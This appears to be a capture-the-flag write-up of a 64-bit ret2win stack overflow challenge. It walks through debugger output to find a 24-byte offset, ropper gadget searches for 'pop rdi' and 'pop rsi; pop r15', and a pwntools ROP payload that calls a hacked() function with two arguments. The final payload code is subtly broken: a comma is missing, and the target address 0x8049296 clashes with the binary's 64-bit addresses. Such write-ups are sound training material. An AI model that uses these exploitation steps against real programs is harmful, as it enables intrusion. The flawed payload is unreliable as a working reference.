
### Finding the offset
It is a x64-program, so we need to find the offset of `$rsp`.
```
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
$rax   : 0x40b             
$rbx   : 0x0               
$rcx   : 0x0               
$rdx   : 0x0               
$rsp   : 0x007fffffffe1e8  →  "daaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaaja[...]"
$rbp   : 0x6161616161616163 ("caaaaaaa"?)
$rsi   : 0x000000004052a0  →  "afcaaaaaaf\naaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaa[...]"
$rdi   : 0x0               
$rip   : 0x000000004011d6  →  <register_name+70> ret 
$r8    : 0xffffffffffffffea
$r9    : 0x007ffff7f660c0  →  0x0000000000000000
$r10   : 0x007ffff7f65fc0  →  0x0000000000000000
$r11   : 0x246             
$r12   : 0x00000000401060  →  <_start+0> xor ebp, ebp
$r13   : 0x0               
$r14   : 0x0               
$r15   : 0x0               
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
0x007fffffffe1e8│+0x0000: "daaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaaja[...]"      ← $rsp
0x007fffffffe1f0│+0x0008: "eaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaaka[...]"
0x007fffffffe1f8│+0x0010: "faaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaala[...]"
0x007fffffffe200│+0x0018: "gaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaama[...]"
0x007fffffffe208│+0x0020: "haaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaana[...]"
0x007fffffffe210│+0x0028: "iaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoa[...]"
0x007fffffffe218│+0x0030: "jaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapa[...]"
0x007fffffffe220│+0x0038: "kaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqa[...]"
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
     0x4011cf <register_name+63> call   0x401040 <printf@plt>
     0x4011d4 <register_name+68> nop    
     0x4011d5 <register_name+69> leave  
 →   0x4011d6 <register_name+70> ret    
[!] Cannot disassemble from $PC
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[#0] Id 1, Name: "ret2win", stopped 0x4011d6 in register_name (), reason: SIGSEGV
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[#0] 0x4011d6 → register_name()
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  pattern offset $rsp
[+] Searching for '$rsp'
[+] Found at offset 24 (little-endian search) likely
[+] Found at offset 17 (big-endian search) 
```
So the offset is 24.

For the location of the `hacked()` function, we use this code:
```
import pwn
elf = pwn.ELF("./ret2win")
print(hex(elf.symbols["hacked"]))
```

### Finding the gadgets

For the `pop_rdi` and the `pop_rsi` we use the `ropper` tool:

```
┌─[root@edu-virtualbox]─[/home/edu/picoctf/ret2win_cryptocat/64_bit]
└──╼ #python3 -m ropper --file ret2win --search "pop rdi"
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[INFO] Load gadgets for section: GNU_STACK
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi

[INFO] File: ret2win
0x000000000040124b: pop rdi; ret; 

```
So `0x40124b`.
We do the same for `rsi`, and we find `0x401249`
```
┌─[root@edu-virtualbox]─[/home/edu/picoctf/ret2win_cryptocat/64_bit]
└──╼ #python3 -m ropper --file ret2win --search "pop rsi"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rsi

[INFO] File: ret2win
0x0000000000401249: pop rsi; pop r15; ret; 
```
The problem is, it pops `r15` as well, so we'll have to add an empty byte to fill up `r15`.


Because there are 2 arguments to the function, our exploit will look like this:
```
padding +  pop_rdi + param_1 + pop_rsi + param_2 + junk_byte + hacked()_address
```


So we use the `p64` function, and create the payload:
```
payload = b"".join(
[
	24 * b"A",
	
	pwn.p64(0x40124b),   # pop_rdi
	pwn.p64(0xdeadbeefdeadbeef), # First argument
	pwn.p64(0x401249),   # pop_rsi
	pwn.p64(0xc0debabec0debabe), # Second argument
	pwn.p64(0x0) # junk byte
	pwn.p64(0x8049296),  # hacked() function
]
)
```